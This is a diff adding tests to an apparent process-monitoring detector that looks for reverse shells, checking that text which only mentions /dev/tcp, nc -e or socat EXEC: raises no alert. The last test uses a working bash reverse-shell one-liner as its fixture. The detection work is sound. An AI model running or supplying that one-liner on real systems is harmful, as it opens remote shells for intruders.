@@ -143,3 +143,29 @@ def test_real_proc_leaves_own_test_process_without_finding():
     findings = checks.check_processes(Path("/proc"))
     own = f"/proc/{os.getpid()}"
     assert all(f.path != own for f in findings)
+
+
+def test_a_proc_root_given_as_a_string_is_read_too(tmp_path):
+    # The CLI and callers pass "/proc"; the first version divided a str.
+    from delfin.watchpost import checks
+    assert checks.check_processes(str(tmp_path)) == []
+
+
+def test_text_about_a_reverse_shell_is_not_a_reverse_shell(tmp_path):
+    # First live run (2026-09-25): a DELFIN agent whose task text, passed
+    # as an argument, described /dev/tcp, nc -e and socat exec: raised
+    # three alerts. The shapes are judged on the program now.
+    from delfin.watchpost import checks
+    _mk_proc(tmp_path, 301, ["/usr/bin/python3", "delfin-agent", "chat",
+                             "look for /dev/tcp/, nc -e and socat EXEC: "
+                             "in the user's processes"])
+    assert checks.check_processes(tmp_path) == []
+
+
+def test_a_shell_whose_script_only_mentions_dev_tcp_is_no_connection(tmp_path):
+    from delfin.watchpost import checks
+    _mk_proc(tmp_path, 302, ["/bin/bash", "-c",
+                             "git commit -m 'judge /dev/tcp/ by host and port'"])
+    _mk_proc(tmp_path, 303, ["/bin/bash", "-c",
+                             "bash -i >& /dev/tcp/10.0.0.7/4444 0>&1"])
+    assert [f.path for f in checks.check_processes(tmp_path)] == ["/proc/303"]
